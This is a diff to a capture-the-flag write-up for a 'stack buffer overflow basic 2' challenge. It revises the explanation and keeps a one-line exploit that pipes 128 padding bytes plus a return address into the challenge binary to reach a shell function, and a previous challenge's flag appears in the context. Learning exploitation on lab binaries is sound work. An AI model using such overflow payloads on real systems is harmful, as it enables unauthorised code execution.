@@ -25,7 +25,9 @@ We get ``1w4ntm0r3pr0np1s``
 
 # ***STACK BUFFER OVERFLOW BASIC 2***
 
-From the given the challenge we give the buffer value as 128 and here if we send the address of the shell we get the shell
+From the given the challenge we give the buffer value as 128 and here if we need to call the shell function.
+
+Then we get the interactive shell
 
 
 ```cat <(python -c "print 'A' * 128 + '\x16\x85\x04\x08'") - | ./ch15```
